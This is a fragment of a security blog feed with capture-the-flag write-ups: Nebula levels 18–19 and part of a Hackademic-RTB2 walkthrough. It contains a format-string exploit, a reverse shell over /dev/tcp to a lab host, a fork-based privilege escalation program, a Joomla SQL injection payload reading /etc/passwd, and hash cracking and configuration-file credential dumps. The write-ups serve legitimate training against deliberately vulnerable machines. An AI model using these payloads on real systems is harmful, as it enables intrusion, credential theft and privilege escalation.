+b77a8000-b77a9000 rw-p 00000000 00:00 0
+b77b1000-b77b4000 rw-p 00000000 00:00 0
+bfabf000-bfae0000 rw-p 00000000 00:00 0          [stack]
+Aborted
+level18@nebula:/home/flag18$
+</code></p>
+
+<p>I guess not.  It appears it&rsquo;s been compiled with a bit of protection:</p>
+
+<p><code>
+level18@nebula:/home/flag18$ ./checksec.sh --file flag18
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   flag18
+level18@nebula:/home/flag18$
+</code></p>
+
+<p>On deeper inspection of the code, it appears there are several logic flaws that could allow simple execution of a root shell.</p>
+
+<p>The first issue is that there&rsquo;s no restriction on what file we&rsquo;re debugging to, so long as we&rsquo;ve got the privileges required to open it.  In this case, this means we can debug to the same file that we&rsquo;re checking passwords against.  Since we can&rsquo;t actually read the file, we need to infer:</p>
+
+<p><code>
+level18@nebula:/home/flag18$ ./flag18 -d /home/flag18/password
+^Clevel18@nebula:/home/flag18$ ls -lh password
+-rw------- 1 flag18 flag18 31 2013-03-20 00:38 password
+level18@nebula:/home/flag18$ echo Starting up. Verbose level = 0 | wc -c
+31
+level18@nebula:/home/flag18$
+</code></p>
+
+<p>So we read without error and we know the exact data in the file.  The problem with this is that it strips newlines, and with fgets we don&rsquo;t have a nice way of inserting them.</p>
+
+<p>The second issue I discovered involved the command site exec, which doesn&rsquo;t properly format output, and won&rsquo;t append newlines (which may be used to further the first issue).</p>
+
+<p><code>
+level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg
+site exec %n
+*** %n in writable segment detected ***
+Aborted
+level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg
+site exec %4$x
+*** invalid %N$ use detected ***
+Aborted
+level18@nebula:/home/flag18$
+</code></p>
+
+<p>This means that our binary was likely compiled with <a href="https://wiki.edubuntu.org/ToolChain/CompilerFlags">FORTIFY_SOURCE=2</a>.  <a href="http://gcc.gnu.org/ml/gcc-patches/2004-09/msg02055.html">Here&rsquo;s</a> the patch that explains what it is and prevents, and the differences between 1 and 2.  Because I don&rsquo;t take doors slammed in my face very well, and it&rsquo;s late, it&rsquo;s time to break out the <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9">phrack</a>:</p>
+
+<p>```
+level18@nebula:/home/flag18$ gdb ./flag18
+Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.
+(gdb) r -d /tmp/dbg
+Starting program: /home/flag18/flag18 -d /tmp/dbg
+site exec %1$*269168516$x %1073741824$</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x0028b359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb)
+```</p>
+
+<p>Exploitation of this wasn&rsquo;t trivial, but it was eye-opening into some of the things you can accomplish with format string vulnerabilities.  Because our binary was compiled with FORTIFY_SOURCE, there are essentially two things we need to do: disable the FORTIFY flag, and disable the argument filler.  The argument filler essentially sets every argument in arguments[argc] to -1, then fills in the user supplied arguments.  Any -1&rsquo;s remaining will cause an error.  At a high level we&rsquo;re doing this:
++ Disable FORTIFY_SOURCE flag
++ Modify nargs to blow up
++ Be happy</p>
+
+<p>The Phrack article does a better job of explaining this than I do, so if you&rsquo;d like an in-depth analysis of all this, follow the article.  Anyway &mdash; finding and disabling FORTIFY_SOURCE:</p>
+
+<p>```
+level18@nebula:/home/flag18$ gdb ./flag18
+Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.
+(gdb) b vfprintf
+Function &ldquo;vfprintf&rdquo; not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (vfprintf) pending.
+(gdb) r -d /tmp/dbg
+site exec %1$*2222848$x %1073741824$</p>
+
+<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) c
+Continuing.</p>
+
+<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) tb *(vfprintf+4649)
+Temporary breakpoint 2 at 0x172359
+(gdb) c
+Continuing.</p>
+
+<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/x $eax
+0xbfffef60:    0xfbad8004
+(gdb) x/20wx $eax
+0xbfffef60:    0xfbad8004    0xbffff4f8    0x0017192c    0xbffff528
+0xbfffef70:    0xbfffcf60    0xbfffcf60    0xbfffef60    0x00000000
+0xbfffef80:    0x00000000    0x00000000    0x00000027    0x08049017
+0xbfffef90:    0xfbad8004    0x00000000    0x00000000    0x00000004
+0xbfffefa0:    0xbfffcf90    0xbf00cfaf    0x00000000    0x00000000
+(gdb) x/wx 0xbfffef9c
+0xbfffef9c:    0x00000004
+(gdb)
+```</p>
+
+<p>There&rsquo;s obviously a bit of cheating here, but bare with me: we&rsquo;re essentially breaking on vfprintf, which receives a file pointer, a formatter, and an argument list.  We then take a peek at the stack, note our file pointer, and find the flag inside (0x000000004).  We know need to calculate the offset:</p>
+
+<p><code>
+(gdb) x/wx 0xbfffef9c
+0xbfffef9c:    0x00000004
+(gdb) p/d ((0xbfffef9c-$ecx)&amp;0xffffffff)/4
+$1 = 2847
+(gdb)
+</code></p>
+
+<p>And accounting for off-by-one, it&rsquo;s 2848.  So:</p>
+
+<p>```
+(gdb) r -d /tmp/dbg
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/flag18/flag18 -d /tmp/dbg
+site exec %1$*2848$x %1073741824$</p>
+
+<p>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) tb *(vfprintf+4649)
+Temporary breakpoint 4 at 0x172359
+(gdb) c
+Continuing.</p>
+
+<p>Temporary breakpoint 4, 0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/i $eip
+=> 0x172359 &lt;vfprintf+4649>:    mov    DWORD PTR [edx+eax<em>4],0x0
+(gdb) x/wx $ecx+$eax</em>4
+0xbfffef9c:    0x00000004
+(gdb)
+```</p>
+
+<p>Great, we&rsquo;ve got the correct value for clobbering that flag.  Now we need to find the offset for clobbering nargs:</p>
+
+<p>```
+(gdb) find 0xbfff0000, 0xbffffff0, 0xdeadbeef
+0xbfff5568
+0xbfff59ec
+2 patterns found.
+(gdb) -r
+Starting program: /home/flag18/flag18 -d /tmp/dbg
+site exec %1$*283434$x %1073741824$</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) p/d (0xbfff5568-$ecx)/4 + 1
+$6 = 479
+(gdb)
+```</p>
+
+<p>I got stuck here for awhile, and after some googling I discovered someone had already solved this level this way!  So I took <a href="http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html">his</a> advice and created an environmental variable that would lower the stack address and not segfault.  The final phase is now upon us; smuggling shellcode in.  The Phrack article gets a little hairy at this point, so instead of screwing around with adjusting stack offsets, I decided to just take the route that v0id took in his blog post.  His process involves setting the loggedin variable by way of taking control of uninitialized stack memory, thanks to <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Rosenburg&rsquo;s</a> fantastic post on this topic:</p>
+
+<p>```
+site exec |%20$n| %1$<em>479$ %1$</em>2848$ %1073741824$</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x00d7af00 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x41414141    1094795585
+ecx            0x0    0
+edx            0x1    1
+ebx            0xeafff4    15400948
+esp            0xbfdb8b9c    0xbfdb8b9c
+ebp            0xbfdb97e8    0xbfdb97e8
+esi            0xbfdbb810    -1076119536
+edi            0xbfdb8bc0    -1076130880
+eip            0xd7af00    0xd7af00 &lt;vfprintf+11728>
+eflags         0x10246    [ PF ZF IF RF ]
+cs             0x73    115
+ss             0x7b    123
+ds             0x7b    123
+es             0x7b    123
+fs             0x0    0
+gs             0x33    51
+(gdb)
+```</p>
+
+<p>So we just need to find the loggedin variable, then call shell on it:</p>
+
+<p><code>
+(gdb) x/2i $eip
+=&gt; 0x8048928 &lt;main+376&gt;:    cmp    DWORD PTR ds:0x804b0b4,0x1
+   0x804892f &lt;main+383&gt;:    jle    0x804894d &lt;main+413&gt;
+(gdb) x/x 0x804b0b4
+0x804b0b0 &lt;globals+4&gt;:    0x00000000
+</code></p>
+
+<p>Stick that into our LD_PRELOAD, sprinkle in a bit of stack alignment, and&hellip;</p>
+
+<p><code>``
+level18@nebula:/home/flag18$ export LD_PRELOAD=</code>python -c &lsquo;print &ldquo;\xb4\xb0\x04\x08&rdquo;<em>8000&rsquo;`
+level18@nebula:/home/flag18$ gdb ./flag18
+(gdb) r -d /tmp/dbg
+site exec |%20$n| %1$</em>479$ %1$*2848$ %1073741824$
+shell
+./flag18: -d: invalid option
+Usage:    ./flag18 [GNU long option] [option] &hellip;</p>
+
+<pre><code>./flag18 [GNU long option] [option] script-file ...
+</code></pre>
+
+<p>GNU long options:</p>
+
+<pre><code>--debug
+--debugger
+--dump-po-strings
+--dump-strings
+--help
+--init-file
+--login
+--noediting
+--noprofile
+--norc
+--posix
+--protected
+--rcfile
+--restricted
+--verbose
+--version
+</code></pre>
+
+<p>Shell options:</p>
+
+<pre><code>-irsD or -c command or -O shopt_option        (invocation only)
+-abefhkmnptuvxBCHP or -o option
+</code></pre>
+
+<p>level18@nebula:/home/flag18$
+```</p>
+
+<p>Success!  It&rsquo;s clearly passing in the -d flag to sh, so&hellip;</p>
+
+<p><code>``
+level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
+site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
+shell
+/tmp/dbg: line 1: Starting: command not found
+/tmp/dbg: line 2: syntax error near unexpected token</code>||&lsquo;
+/tmp/dbg: line 2: `|| %134525108%-1274542928 %&rsquo;
+level18@nebula:/home/flag18$ cat /tmp/Starting</p>
+
+<h1>!/bin/bash</h1>
+
+<p>/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&amp;1
+level18@nebula:/home/flag18$ export PATH=/tmp:$PATH
+level18@nebula:/home/flag18$ ./flag18 &mdash;rcfile -d /tmp/dbg
+site exec |%20$n| %1$<em>479$ %1$</em>2848$ %1073741824$
+shell
+flag18@nebula:/home/flag18$
+```</p>
+
+<p>A shell was waiting for me on 192.168.1.74:5555.  Lots of subtle intricacies here, but really quite fun.</p>
+
+<p>The third issue is the following snippet:</p>
+
+<p><code>
+26  fp = fopen(PWFILE, "r");
+ 27  if(fp) {
+ 28    char file[64];
+ 29
+ 30    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
+ 31      dprintf("Unable to read password file %s\n", PWFILE);
+ 32      return;
+ 33    }
+ 34                fclose(fp);
+ 35    if(strcmp(pw, file) != 0) return;    
+ 36  }
+ 37  dprintf("logged in successfully (with%s password file)\n",
+ 38    fp == NULL ? "out" : "");
+ 39  
+ 40  globals.loggedin = 1;
+</code></p>
+
+<p>If the application fails to read PWFILE, the flow will automatically assume the user is logged in.  This appears to be either the easy or intermediate way, as source code explicitly calls this case out (with%s password file).  This could be defeated by opening up a ton of files and running the binary, effectively erroring out fopen and getting the loggedin flag set.</p>
+
+<h3>Level 19</h3>
+
+
+<p>We now arrive at the final level of Nebula.  This level checks the owner of the calling process and, if root, pops a shell.  This level was kinda neat because it requires you to have an understanding of how forking and parent/child processing works; and if you know that, it&rsquo;s pretty easy.  In this level we&rsquo;re going to exploit an <a href="http://www.geekride.com/orphan-zombie-process/">orphan process</a> and its reclamation process.  When a parent of a child process terminates, the child process stays alive and becomes an orphan process.  This orphan process is automatically reclaimed by an init process:</p>
+
+<p>```
+Parent generates child process:</p>
+
+<pre><code>        -- child
+       /
+</code></pre>
+
+<p>parent &mdash;&ndash;/</p>
+
+<p>Parent dies:</p>
+
+<pre><code>    -- child
+   X
+</code></pre>
+
+<p>x &mdash;&mdash;/</p>
+
+<p>init process discovers child and adopts:</p>
+
+<pre><code>     -- child
+    /
+</code></pre>
+
+<p>init&mdash;&ndash;/
+```</p>
+
+<p>So we want to fork off a process and kill the parent before it calls flag19.  Then, when it goes to stat the process, it will stat init instead of us thereby assuming the role of root.  Here&rsquo;s the code for achieving that:</p>
+
+<p>```</p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<p>void main(void){</p>
+
+<pre><code>pid_t pid;
+char cmd[]   = "/home/flag19/flag19";
+char *argv[] = {"/bin/sh", "-c", "/bin/getflag &gt; /tmp/flagged"};
+
+switch( pid = fork() ){
+    case -1:
+        perror("failed to fork\n");
+    case 0:
+        // execute command when parent dies
+        sleep(2);
+        execvp(cmd, argv);
+    default:
+        sleep(1); // wait a sec
+        exit(1); // ok kill parent
+    }
+</code></pre>
+
+<p>}
+```</p>
+
+<p>And flag was waiting for us in <code>/tmp/flagged</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Solving Hackademic-RTB2]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2/"/>
+    <updated>2012-11-18T00:24:24-08:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2</id>
+    <content type="html"><![CDATA[<p>Here&rsquo;s the second distro from mr. pr0n&rsquo;s realistic pentest discs.  This one was quite fun as I had almost zero experience with Joomla front ends, which so happens to be the entry point on this disc.  A little disappointed with the finale, but overall impressed with this disc.  With that, the iconic nmap:</p>
+
+<p>```</p>
+
+<h1>Nmap 6.01 scan initiated Wed Nov 14 16:45:09 2012 as: nmap -sS -p- -T5 -A -oN r2.scan 192.168.1.75</h1>
+
+<p>Nmap scan report for 192.168.1.75
+Host is up (0.00016s latency).
+Not shown: 65533 closed ports
+PORT    STATE    SERVICE VERSION
+80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
+|<em>http-title: Hackademic.RTB2
+|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
+666/tcp filtered doom
+MAC Address: 08:00:27:E5:D1:B9 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.17 &ndash; 2.6.36, Linux 2.6.19 &ndash; 2.6.35
+Network Distance: 1 hop</p>
+
+<p>TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms 192.168.1.75</p>
+
+<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>
+
+<h1>Nmap done at Wed Nov 14 16:45:22 2012 &mdash; 1 IP address (1 host up) scanned in 13.36 seconds</h1>
+
+<p>```</p>
+
+<p>Much like the first one, we&rsquo;ve essentially just got an HTTP server.  Port 666 is tagged as Doom, but its likely there&rsquo;s something else on there.</p>
+
+<p><img src="/images/posts/2012/hrt2_1.jpg"></p>
+
+<p>There&rsquo;s the main page.  Doesn&rsquo;t look to be hosted on a web platform, and it doesn&rsquo;t appear to be vulnerable to any SQLi.  Running a few queries&hellip;</p>
+
+<p>```
+root@bt:/pentest/web/nikto# perl nikto.pl -host <a href="http://192.168.1.75">http://192.168.1.75</a></p>
+
+<h2>&ndash; Nikto v2.1.5</h2>
+
+<ul>
+<li>Target IP:          192.168.1.75</li>
+<li>Target Hostname:    192.168.1.75</li>
+<li>Target Port:        80
+
+<ul>
+<li>Start Time:         2012-11-15 18:41:46 (GMT-6)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>Server: Apache/2.2.14 (Ubuntu)</li>
+<li>Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7</li>
+<li>Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.</li>
+<li>DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.</li>
+<li>OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>OSVDB-3268: /icons/: Directory indexing found.</li>
+<li>OSVDB-3233: /icons/README: Apache default file found.</li>
+<li>/phpmyadmin/: phpMyAdmin directory found</li>
+<li>6474 items checked: 0 error(s) and 8 item(s) reported on remote host
+
+<ul>
+<li>End Time:           2012-11-15 18:42:00 (GMT-6) (14 seconds)</li>
+</ul>
+</li>
+</ul>
+
+
+<hr />
+
+<ul>
+<li>1 host(s) tested
+root@bt:/pentest/web/nikto#
+```</li>
+</ul>
+
+
+<p><img src="/images/posts/2012/hrt2_2.jpg"></p>
+
+<p>There appears to be a phpMyAdmin not locked down, but it doesn&rsquo;t appear to be vulnerable to anything right off the bat.  Checking that 666 port again, connecting with netcat seems to dump out a bunch of HTML.  Weird; connecting now&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt2_3.jpg"></p>
+
+<p>It appears that port 666 has some form of port knocking or filtering enabled.  It also appears to be hosted on Joomla 1.5.  <a href="http://cxsecurity.com/issue/WLB-2008080155">There&rsquo;s</a> an interesting SQLi for early 1.5 builds, but alas this one is already patched.  This is the part where I had to do a lot of googling; I&rsquo;ve only ever made cosmetic modifications to Joomla sites.  The gist of evaluating a Joomla box is enumeration of plugins/modules and platform vulnerabilities.  Plugins are typically found at <a href="http://site.com/index.php?option=com_MODULE.">http://site.com/index.php?option=com_MODULE.</a>  From there it&rsquo;s sqlmapping, exploit-db'ing (when it&rsquo;s available&hellip;), and googling.  Fortunately I stumbled upon a tool that tossed a lot of this toil into a simple package; NBS 0.3 Joomla Addon Attack Tool.  This came prepackaged with vulnerable plugin lists that evaluated their existence on the box as well as whether they were vulnerable or not.  The tool required a bit of tweaking on my part to account for the non-default port, but otherwise it worked well:</p>
+
+<p>```
+&ndash;=[ NBS 0.3 &ndash; Joomla Addon Attack Tool ]=&ndash;</p>
+
+<p>Make sure you write &lsquo;Yes&rsquo; or &lsquo;No&rsquo; without apostrophes.
+Do you wish to scan for addons? Yes or No: Yes</p>
+
+<p>&ndash;= Joomla Addon Vulnerability Scanner =&ndash;</p>
+
+<p>Example: <a href="http://www.domain.tld">http://www.domain.tld</a>
+[&ndash;] Enter a target to scan: <a href="http://192.168.1.75">http://192.168.1.75</a>
+[&ndash;] Enter the target port [80]: 666
+[<em>] Trying: index.php?option=com_jscalendar&amp;view=jscalendar&amp;task=details&amp;ev_id=
+[</em>] Trying: index.php?option=com_jedirectory&amp;view=item&amp;catid=
+[<em>] Trying: index.php?option=com_jejob&amp;view=item_detail&amp;itemid=
+[</em>] Trying: index.php?option=com_elite_experts&amp;task=showExpertProfileDetailed&amp;getExpertsFromCountry=&amp;language=ru&amp;id=
+[<em>] Trying: index.php?option=com_ezautos&amp;Itemid=49&amp;id=1&amp;task=helpers&amp;firstCode=
+[</em>] Trying: index.php?option=com_timetrack&amp;view=timetrack&amp;ct_id=
+[<em>] Trying: index.php?option=com_jgen&amp;task=view&amp;id=
+[</em>] Trying: index.php?option=com_zoomportfolio&amp;view=portfolio&amp;view=portfolio&amp;id=
+[<em>] Trying: index.php?option=com_fabrik&amp;view=table&amp;tableid=
+[</em>] Trying: index.php?option=com_zina&amp;view=zina&amp;Itemid=
+[<em>] Trying: index.php?option=com_ongallery&amp;task=ft&amp;id=
+[</em>] Trying: index.php?option=com_equipment&amp;view=details&amp;id=
+[<em>] Trying: index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[</em>] Addon Found: index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[+] This addon appears to be vulnerable!
+[+] Exploited with  index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[+] Full exploit string: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1+UNION+SELECT+load_file(&lsquo;/etc/passwd&rsquo;)
+root@bt:~/hackademicr2/nbs03#
+```</p>
+
+<p>Just like that I knew the vulnerable plugin and the query string to exploit it.  This dumps:</p>
+
+<p><code>
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:107::/var/run/dbus:/bin/false avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false saned:x:112:118::/home/saned:/bin/false hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false p0wnbox:x:1000:1000:p0wnbox,,,:/home/p0wnbox:/bin/bash mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false
+</code></p>
+
+<p>Playing around with sqlsus, we find:</p>
+
+<p>```
+root@bt:/pentest/database/sqlsus# ./sqlsus hackr2.conf</p>
+
+<pre><code>          sqlsus version 0.7.2
+</code></pre>
+
+<p>  Copyright &copy; 2008-2011 Jérémy Ruffet (sativouf)</p>
+
+<p>[+] Session &ldquo;192.168.1.75&rdquo; created
+sqlsus> start
+[+] Correct number of columns for UNION : 1 (1)
+[+] Length restriction on URL : 8200 bytes                    <br/>
+[+] Filling %target&hellip;
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| Variable | Value              |
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| database | joomla             |
+| user     | &lsquo;root&rsquo;@&lsquo;localhost&rsquo; |
+| version  | 5.1.41-3ubuntu12.8 |
++&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+3 rows in set</p>
+
+<p>sqlsus>
+```</p>
+
+<p>And for reference:</p>
+
+<p><code>
+root@bt:/pentest/database/sqlsus# cat hackr2.conf | grep 192.168.1.75
+our $url_start = "http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1";
+</code></p>
+
+<p>Looking up the Joomla 1.5 <a href="http://docs.joomla.org/Detailed_list_of_fields">database schema</a>, we find the users can be found in jos_users:</p>
+
+<p>```
+sqlsus> get columns jos_users
+[+] Getting columns names for joomla.jos_users
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+                                            <br/>
+| Columns in jos_users |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| id                   |
+| name                 |
+| username             |
+| email                |
+| password             |
+| usertype             |
+| block                |
+| sendemail            |
+| gid                  |
+| registerdate         |
+| lastvisitdate        |
+| activation           |
+| params               |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+13 rows in set</p>
+
+<p>sqlsus> select id,username,password,usertype from jos_users
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| id | username      | password                                                          | usertype            |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| 62 | Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Super Administrator |
+| 63 | JSmith        | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | Registered          |
+| 64 | BTallor       | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | Registered          |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+3 rows in set (2 hits)</p>
+
+<p>sqlsus>
+```</p>
+
+<p>These passwords are stored as md5(password + salt), so we need to load them up into Hashcat or john and let them run around.  As a note, I modified the hashes a bit to be in the form <code>username:md5$salt</code></p>
+
+<p><code>
+root@bt:/pentest/passwords/john# john --wordlist=/pentest/passwords/wordlists/rockyou.txt --form=dynamic_1 /root/hackademicr2/hashes.txt
+Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 SSE2 intrinsics 32x4x1])
+Remaining 1 password hash
+guesses: 0  time: 0:00:00:03 DONE (Thu Nov 15 23:03:45 2012)  c/s: 4333K  trying:   b1tch3s   -  * 7¡Vamos!
+root@bt:/pentest/passwords/john# cat john.pot
+$dynamic_1$992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF:matrix
+$dynamic_1$abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy:victim
+root@bt:/pentest/passwords/john#
+</code></p>
+
+<p>Well we got the two users, but no super admin.</p>
+
+<p>I handed the hash off for further cracking elsewhere, but lets again take a look at the results dirbuster turned up:</p>
+
+<p><img src="/images/posts/2012/hrt2_4.jpg"></p>
+
+<p>After more digging through Joomla documentation, turns out the &lsquo;configuration.php&rsquo; holds, surprise, Joomla site configurations, specifically..</p>
+
+<p><code>
+root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1" -p 'catid' --dbms mysql --file-read="/var/www/configuration.php"
+[SNIP]
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_var_www_configuration.php
+&lt;?php
+class JConfig {
+/* Site Settings */
+var $offline = '0';
+var $offline_message = 'This site is down for maintenance.&lt;br /&gt; Please check back again soon.';
+var $sitename = 'Hackademic.RTB2';
+var $editor = 'tinymce';
+var $list_limit = '20';
+var $legacy = '0';
+/* Debug Settings */
+var $debug = '0';
+var $debug_lang = '0';
+/* Database Settings */
+var $dbtype = 'mysql';
+var $host = 'localhost';
+var $user = 'root';
+var $password = 'yUtJklM97W';
+var $db = 'joomla';
+var $dbprefix = 'jos_';
+/* Server Settings */
+var $live_site = '';
+var $secret = 'iFzlVUCg9BBPoUDU';
+var $gzip = '0';
+var $error_reporting = '-1';
+var $helpurl = 'http://help.joomla.org';
+var $xmlrpc_server = '0';
+var $ftp_host = '127.0.0.1';
+var $ftp_port = '21';
+var $ftp_user = '';
+var $ftp_pass = '';
+var $ftp_root = '';
+var $ftp_enable = '0';
+var $force_ssl = '0';
+[SNIP]
+</code></p>
+
+<p>Huzzah, root password hardcoded into the configuration file.  Note that this is only the MySQL root password, although its entirely possible that its also the system root password.  We know that there exists a phpMyAdmin listener, so lets log into that with our newfound credentials:</p>
+
+<p><img src="/images/posts/2012/hrt2_5.jpg"></p>
+
